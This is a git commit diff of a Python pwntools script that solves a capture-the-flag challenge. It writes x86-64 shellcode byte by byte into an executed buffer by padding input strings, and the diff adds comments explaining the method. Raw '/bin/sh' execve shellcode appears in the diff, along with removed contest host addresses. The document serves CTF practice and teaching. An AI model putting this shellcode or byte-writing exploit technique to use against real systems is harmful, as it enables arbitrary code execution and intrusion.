a129c0b87e26af33acc9cba0c94cc93a67d78aa5
bkth <bruno.keith@orange.fr>
2016-03-02 01:35:06 +0100

    commented

--- hitb_ams/script.py
+++ hitb_ams/script.py
@@ -3,11 +3,17 @@ import ast
 
 base_string = "SUGAR"
 
-#shellcode = "\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xff\x49\xb8\xae\xb7\x72\xc3\xdb\xf0\xfa\xff\x49\x31\xc8\x41\x50\x49\xb8\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x49\x31\xc8\x41\x50\x49\xb8\xb7\xce\x2d\xad\x4f\xc4\xb7\x46\x49\x31\xc8\x41\x50\xff\xe4"
-#shellcode = "\x90\x90\x90\xc3"
+# spawn shell linux x64
+#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xC0\xb0\x3b\x0f\x05"
+
+# test with returns
+#shellcode = "\xc3\xc3"
 
 
-shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xC0\xb0\x3b\x0f\x05"
+#the challenge let us write byte by byte in a buffer which is call at 0x400ed7 as code, so the idea is to write shellcode byte by byte
+# the write is done with the following, a nonce multiplied by 4919 is printed, this nonce is added to the sum of the int value of each char
+# supplied as input and put in truncated in a byte which is written a 0x7ffff7ff4000, each write increments the index by one
+
 
 base_val = 0
 min_val = 65
@@ -19,6 +25,7 @@ def add_bytes(string):
         cpt += ord(c)
     return cpt + base_val
 
+# pad the string so that the write will write the byte sh
 def pad_string(string, sh):
     while (ord(sh) - add_bytes(string)) % 256 < min_val or (ord(sh) - add_bytes(string)) % 256 > max_val :
         #print "string is " + string + " addbytes val is " + str(add_bytes(string)) + " mod256 " + str(add_bytes(string) % 256)
@@ -28,8 +35,8 @@ def pad_string(string, sh):
     return string
 
 
-HOST='52.17.31.229'
-PORT=31337
+HOST='127.0.0.1'
+PORT=4444
 s = remote(HOST,PORT)
 
 intro = s.recvuntil('up to ')
@@ -54,42 +61,7 @@ for sh in shellcode:
     s.send(pad_string(base_string, sh) + "\n")
     print s.recvuntil("ingredient> ")
 
-print "sending BAKE"
+#print "sending BAKE"
 
 s.send("BAKE" + "\n")
-print s.recv(1024)
-
-
-"""
-HOST='188.166.133.53'
-PORT=11491
-s = remote(HOST,PORT)
-
-intro = s.recvuntil('path?\n')
-print intro
-
-print "time to finish"
-i = 0
-iteration = 0
-while True:
-    if i == 1: 
-        response = s.recvuntil('!\n')
-        print "reponse: " + response
-    if iteration == 50:
-        print s.recv(1024)
-    level = s.recvuntil(']')
-    print "level: " + level
-    values = []
-    try:
-        values = ast.literal_eval(level[10:])
-    except:
-       values = ast.literal_eval(level[11:])
-    print values
-    n = Node()
-    n.build_from_preorder(values)
-    var = n.print_tree()
-    var = "[" + var + "]"
-    print "[*] sending " + var
-    s.send(var + "\n")
-    i = 1
-    iteration += 1"""
+print s.recvuntil("tym3")
